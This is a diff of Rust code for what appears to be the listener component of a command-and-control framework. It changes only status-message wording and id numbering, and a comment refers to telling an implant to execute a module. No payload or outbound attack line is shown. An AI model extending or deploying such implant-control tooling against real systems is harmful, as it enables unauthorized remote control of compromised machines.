@@ -95,7 +95,7 @@ pub fn lsn_run(lsn: &mut Listener, protocol: &str, address: SocketAddr, sb: &mut
 fn listen_tcp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>){
     lsn.status = 1; // listening mode
     lsn.tcp_sock = Some(TcpListener::bind(address).unwrap());
-    println!("[+] Opening tcp listener on port {}", address.port());
+    println!("[+] Opening TCP listener on port {}", address.port());
     loop {
         // Checks for commands from the client each iteration
         let cmd: u8 = rcv_client_command(lsn, sb);
@@ -136,7 +136,7 @@ fn listen_udp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<Shared
     lsn.status = 1;
     lsn.udp_sock = Some(UdpSocket::bind(address).expect("Couldnt bind address"));
     lsn.udp_sock.as_ref().expect("udp socket not initialized").set_read_timeout(Some(Duration::from_millis(5))).expect("set_read_timeout failed");
-    println!("[+] Opening udp listener on port {}", address.port());
+    println!("[+] Opening UDP listener on port {}", address.port());
     loop {
         // Checks for commands from the client each iteration
         let cmd: u8 = rcv_client_command(lsn, sb);
@@ -173,7 +173,7 @@ fn listen_udp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<Shared
 // 6 => Have the implant execute a module
 // anything else => do nothing (sleep for 10 ms to allow client to unlock shared buffer)
 fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>) {
-    println!("[+] Connection established by listener {}", lsn.id);
+    println!("\n[+] Connection established by listener {}", lsn.id + 1);
     let mut is_interacting: bool = false;
     // memo keeps track of the last String contained within the shared buffer
     // used so that listener can check to see if shared buffer has been read from or written to by client
